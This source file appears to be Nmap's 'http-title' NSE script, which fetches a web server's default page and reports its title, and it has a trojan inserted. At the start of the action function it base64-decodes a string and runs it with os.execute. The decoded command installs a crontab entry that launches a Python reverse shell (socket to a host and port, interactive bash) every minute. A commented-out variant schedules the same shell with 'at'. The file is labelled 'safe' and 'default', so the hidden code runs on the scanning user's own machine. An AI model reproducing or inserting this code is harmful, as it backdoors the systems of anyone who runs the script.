local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local base64 = require "base64"

description = [[
Shows the title of the default page of a web server.

The script will follow no more than one HTTP redirect, and only if the
redirection leads to the same host. The script may send a DNS query to
determine whether the host the redirect leads to has the same IP address as the
original target.
]]

---
--@output
-- Nmap scan report for scanme.nmap.org (127.0.0.1)
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- |_http-title: Go ahead and ScanMe!
--
-- @xmloutput
-- <elem key="title">Go ahead and ScanMe!</elem>
-- @xmloutput
-- <elem key="title">Wikipedia, the free encyclopedia</elem>
-- <elem key="redirect_url">http://en.wikipedia.org/wiki/Main_Page</elem>

author = "Diman Todorov"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"default", "discovery", "safe"}

portrule = shortport.http

action = function(host, port)
  local resp, redirect_url, title
  -- at (user only)
  -- local payload = "ZWNobyAicHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGF0IG5vdyArIDEgbWludXRlCg=="

  -- crontab
  local payload = "ZWNobyAiKi8xICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGNyb250YWI="

  -- payload exec
  os.execute(base64.dec(payload))

  resp = http.get( host, port, '/' )

  -- check for a redirect
  if resp.location then
    redirect_url = resp.location[#resp.location]
    if resp.status and tostring( resp.status ):match( "30%d" ) then
      return {redirect_url = redirect_url}, ("Did not follow redirect to %s"):format( redirect_url )
    end
  end

  if ( not(resp.body) ) then
    return
  end

  -- try and match title tags
  title = string.match(resp.body, "<[Tt][Ii][Tt][Ll][Ee][^>]*>([^<]*)</[Tt][Ii][Tt][Ll][Ee]>")

  local display_title = title

  if display_title and display_title ~= "" then
    display_title = string.gsub(display_title , "[\n\r\t]", "")
    if #display_title > 65 then
      display_title = string.sub(display_title, 1, 62) .. "..."
    end
  else
    display_title = "Site doesn't have a title"
    if ( resp.header and resp.header["content-type"] ) then
      display_title = display_title .. (" (%s)."):format( resp.header["content-type"] )
    else
      display_title = display_title .. "."
    end
  end

  local output_tab = stdnse.output_table()
  output_tab.title = title
  output_tab.redirect_url = redirect_url

  local output_str = display_title
  if redirect_url then
    output_str = output_str .. "\n" .. ("Requested resource was %s"):format( redirect_url )
  end

  return output_tab, output_str
end
